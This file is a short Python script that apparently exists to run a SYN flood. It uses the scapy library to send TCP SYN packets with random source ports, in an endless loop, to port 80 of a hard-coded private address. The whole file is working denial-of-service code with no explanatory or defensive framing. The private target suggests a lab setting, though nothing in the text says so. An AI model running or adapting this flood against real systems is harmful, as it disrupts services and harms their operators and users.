from scapy.all import *
import random

target_ip = "172.20.10.6"
target_port = 80

def syn_flood():
    ip = IP(dst=target_ip)

    tcp = TCP(
        sport=random.randint(1024,65535),
        dport=target_port,
        flags="S"
    )

    packet = ip/tcp
    send(packet, verbose=0)

while True:
    syn_flood()
